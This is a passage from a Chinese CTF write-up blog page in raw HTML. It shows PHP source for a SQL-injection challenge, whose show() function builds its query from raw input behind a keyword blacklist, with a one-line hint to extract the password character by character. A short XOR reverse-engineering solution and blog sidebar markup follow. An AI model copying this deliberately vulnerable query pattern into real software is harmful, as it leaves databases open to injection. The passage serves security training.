class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"> &lt;?php  </div><div class="line">include("config.php"); </div><div class="line"></div><div class="line">mysql_query("set names utf8"); </div><div class="line"></div><div class="line">function randStr($lenth=32)&#123; </div><div class="line">    $strBase = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"; </div><div class="line">    $str = ""; </div><div class="line">    while($lenth&gt;0)&#123; </div><div class="line">      $str.=substr($strBase,rand(0,strlen($strBase)-1),1); </div><div class="line">      $lenth --; </div><div class="line">    &#125; </div><div class="line">   return $str; </div><div class="line">&#125; </div><div class="line"></div><div class="line">if($install)&#123; </div><div class="line">    $sql = "create table `user` ( </div><div class="line">         `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT , </div><div class="line">         `username` varchar(30) NOT NULL, </div><div class="line">         `passwd` varchar(32) NOT NULL, </div><div class="line">         `role` varchar(30) NOT NULL </div><div class="line">       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci "; </div><div class="line">    if(mysql_query($sql))&#123; </div><div class="line">       $sql  = "insert into `user`(`username`,`passwd`,`role`) values ('admin','".md5(randStr())."','admin')"; </div><div class="line">       mysql_query($sql); </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line">function filter($str)&#123; </div><div class="line">     $filter = "/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";  </div><div class="line">     if(preg_match($filter,$str))&#123; </div><div class="line">         die("you can't input this illegal char!"); </div><div class="line">     &#125; </div><div class="line">     return $str;  </div><div class="line"></div><div class="line">&#125; </div><div class="line"></div><div class="line"></div><div class="line">function show($username)&#123; </div><div class="line">  global $conn; </div><div class="line">  $sql = "select role from `user` where username ='".$username."'"; </div><div class="line">  $res = mysql_query($sql); </div><div class="line">  if($res)&#123; </div><div class="line"></div><div class="line">      echo "$username is ...."; </div><div class="line">  &#125;else&#123; </div><div class="line">      die("Don't have this user!"); </div><div class="line">  &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line">function login($username,$passwd)&#123; </div><div class="line">    </div><div class="line">    global $flag; </div><div class="line"></div><div class="line">    $username = trim(strtolower($username)); </div><div class="line">    $passwd = trim(strtolower($passwd)); </div><div class="line">    if($username == 'admin')&#123; </div><div class="line">        die("you can't login this as admin!"); </div><div class="line">    &#125; </div><div class="line">     </div><div class="line">    $sql = "select * from `user` where username='".mysql_escape_string($username)."' and passwd='".mysql_escape_string($passwd)."'"; </div><div class="line">    $res = mysql_query($sql); </div><div class="line">    if($res)&#123; </div><div class="line">         exit($flag); </div><div class="line">    &#125;else&#123; </div><div class="line">       echo "sorry,username or passwd error!";   </div><div class="line">    &#125; </div><div class="line"></div><div class="line">&#125; </div><div class="line"></div><div class="line">function source()&#123; </div><div class="line"></div><div class="line">    highlight_file(__FILE__); </div><div class="line">&#125; </div><div class="line"></div><div class="line">$username = isset($_POST['username'])?filter($_POST['username']):""; </div><div class="line">$passwd = isset($_POST['passwd'])?filter($_POST['passwd']):""; </div><div class="line"></div><div class="line">$action = isset($_GET['action'])?filter($_GET['action']):"source"; </div><div class="line"></div><div class="line">switch($action)&#123; </div><div class="line">   case "source": source(); break ; </div><div class="line">   case "login" : login($username,$passwd);break; </div><div class="line">   case "show" : show($username);break; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>利用show函数查询password的每一位。</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="多试几次"><a href="#多试几次" class="headerlink" title="多试几次"></a>多试几次</h3><p>惯例先反编译main()函数<br><img src="https://github.com/Windylh/image/raw/master/2017.5.7/Re1-1.png" alt="re1-1"><br>发现输出了一次flag{},感觉事情并没有那么简单，在最后发现了eee()函数。<br><img src="https://github.com/Windylh/image/raw/master/2017.5.7/Re1-2.png" alt="re1-2"></p>
+<p>a的字符串是<code>SDUST</code>,按照代码写脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">'SDUST'</span></div><div class="line">b=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</div><div class="line">    b=b+chr(ord(c)^<span class="number">32</span>)</div><div class="line"><span class="keyword">print</span> b</div></pre></td></tr></table></figure></p>
+<p>flag:<code>sdust</code></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/26/IsccCTF WriteUp/" rel="next" title="IsccCTF WriteUp">
+                <i class="fa fa-chevron-left"></i> IsccCTF WriteUp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/07/11/火种CTF Writeup/" rel="prev" title="火种CTF Writeup">
+                火种CTF Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
+               alt="Windylh" />
+          <p class="site-author-name" itemprop="name">Windylh</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Windylh" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/WindylhPeng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1553700980" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.izilong.net/" title="Zilong" target="_blank">Zilong</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://iwenhu.cn/" title="Mengchen" target="_blank">Mengchen</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://keysking.github.io/" title="Keysking" target="_blank">Keysking</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lanvnal.com/" title="LANVNAL" target="_blank">LANVNAL</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wsimp1er.com/" title="Simp1er" target="_blank">Simp1er</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#zip-？？"><span class="nav-number">1.1.</span> <span class="nav-text">zip ？？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base的n次方"><span class="nav-number">1.2.</span> <span class="nav-text">base的n次方</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shark"><span class="nav-number">1.3.</span> <span class="nav-text">shark</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Preg"><span class="nav-number">2.1.</span> <span class="nav-text">Preg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hash"><span class="nav-number">2.2.</span> <span class="nav-text">Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Coding"><span class="nav-number">2.3.</span> <span class="nav-text">Coding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Getshell"><span class="nav-number">2.4.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql1"><span class="nav-number">2.5.</span> <span class="nav-text">Sql1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#多试几次"><span class="nav-number">3.1.</span> <span class="nav-text">多试几次</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017.3 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("G38Wjo4XURoegldByMbpMI2C-gzGzoHsz", "PAvMrVY87vPwX9PBcMLfYmw4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
